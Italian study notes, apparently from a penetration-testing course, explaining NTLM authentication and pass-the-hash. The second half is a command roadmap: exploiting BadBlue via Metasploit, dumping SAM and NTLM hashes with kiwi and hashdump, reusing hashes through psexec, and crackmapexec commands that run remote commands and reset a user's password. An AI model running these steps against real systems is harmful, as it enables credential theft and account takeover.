## **Cos’è NTLM**

NTLM è l’acronimo di NT [LAN](https://nordvpn.com/it/blog/rete-lan/) Manager, termine che identifica un **insieme di protocolli di autenticazione sviluppato da Microsoft** nel 1993.

Con NTLM è possibile **autenticarsi senza inviare** la propria **password** direttamente attraverso la rete: ciò significa che quando un sistema cerca di collegarsi a un **server**, quest’ultimo **richiederà** l’invio di un **token** valido **anziché password** i che potrebbero essere intercettati da terze parti.

Più nel dettaglio, questo processo si può descrivere con i seguenti passaggi:

1. Il cliente cerca di collegarsi a un server, identificandosi con un determinato nome utente.
2. Il server, che conosce gli abbinamenti di nome utente e password dei client autorizzati, genera un numero casuale e lo invia al client. Questo passaggio rappresenta la challenge, o "sfida".
3. Il client usa il numero casuale ricevuto per creare un hash della password associata al nome utente precedentemente inviato. Allo stesso tempo, anche il server esegue la stessa operazione.
4. Il client invia l’hash così generato al server. Questo passaggio rappresenta la response, o "risposta".
5. Il server confronta l’hash ricevuto con quello generato internamente: se i due valori corrispondono, l’autenticazione è andata a buon fine e al client viene garantito l’accesso al server. Se invece i due valori non corrispondono, il client viene bloccato.

### **NTLM o Kerberos**

Kerberos è una tecnologia che in realtà risale a prima dello sviluppo di NTLM, e che col tempo è diventata sempre più efficace fino a sostituire lo stesso NTLM nei sistemi Windows. Oggi, infatti, Microsoft stessa **sconsiglia** l’uso di NTLM.

### Pass-the-hash

è una tecnica di sfruttamento che prevede la cattura o l'acquisizione di hash NTLM o di password in chiaro e il loro utilizzo per l'autenticazione con con il target in modo legittimo.

**In sostanza permette di accedere ad un servizio senza password in chiaro ma con Hash di password**

Possiamo utilizzare diversi strumenti per facilitare un attacco Pass-The-Hash:

- **Modulo Metasploit PsExec**
- **Crackmapexec**

### Roadmap

MODULO METASPLOIT (crea una **shell permanente** anche se il sistema viene patchato)

1. **search badblue**
2. **use exploit/windows/http/badblue_ext_overflow**
    1. **set rhosts**
    2. se necessario settare opzioni peyload
3. **run** per ottenere shell meterpreter
4. **pgrep lsass** ci da un numero di sessione su cui dovremo migrare
5. **migrate N_SESSIONE** migriamo sulla sessione trovata in precedenza per scalare i privilegi
6. **getuid** verifichiamo se siamo authority\system
7. **load kiwi**
8. **lsa_dump_sam** stampare a schermo gli use e gli hash delle pass
9. copiamo hash administrator
10. **hashdump** ci darà LM hash (uguale per tutti gli utentu) e la NTLM hash (univoca)
    1. copiare gli hash insieme **Esempio= LM0000000:NTLM00000**
11. **crtl+z** mettiamo la sessione meterpreter in background 
12. **search psexec**
13. **use exploit/windows/smb/psexec** inserendo hash otterremo shell meterpreter
    1. **set LPORT** cambiare se la sessione corrente utilizza la stessa porta del payload (possiamo verificarlo con comando **sessions**)
    2. **set RHOSTS**
    3. **set SMBUser NOME_UTENTE**
    4. **set  SMBPass LM0000000:NTLM00000**
    5. **set target Native\ upload**
    6. **run** per ottenere shell meterpreter

CRACKMAPEXEC TOOL

1. **crackmapexec smb IP_TARGET -u NOME_UTENTE -H** “**NTLM00000”**
    1. **-u** nome utente
    2. **-H** hash
2. **-x “whoami”** si mette sempre -x prima di inviare un comando e tra virgolette
3. **-x “net user NOME_UTENTE password 123456789”** cambia la password del nome utente in 123456789
4. **-x “net user”** enumera gli utenti
